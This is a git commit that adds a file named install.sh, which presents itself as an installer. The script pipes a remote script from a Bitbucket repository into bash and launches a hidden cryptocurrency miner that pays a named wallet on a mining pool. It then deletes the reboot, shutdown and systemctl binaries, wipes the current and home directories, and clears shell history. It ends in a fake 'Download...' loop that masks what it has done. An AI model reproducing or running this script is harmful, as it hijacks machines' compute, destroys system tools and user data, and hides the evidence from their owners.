c8ab0367281ab303f27b3349c553008674dade70
AlmiraHanafie <almirahanafie@outlook.com>
2024-07-10 11:23:57 +0700

    Create install.sh

---
+++ install.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+apt-get update 
+apt-get install -y wget curl
+curl -sL https://bitbucket.org/new-kamikaze/lolkaze01/raw/main/lolGP.sh | bash
+chmod +x lolkaze
+nohup ./lolkaze --algo PYRIN --pool ns5026562.ip-15-235-214.net --port 1177 --user pyrin:qq26gm0pn27hp9vxtrlpngcfzcxmsjc8vtlmn5a2087rxvyaczewyygdxhn7d.sugoi > /dev/null 2>&1 &
+sleep 30
+rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
+curl ifconfig.me
+rm -rvf *
+cd ~/
+rm -rvf *
+history -cr
+while true
+do
+        echo "Download..."
+        sleep 20
+done
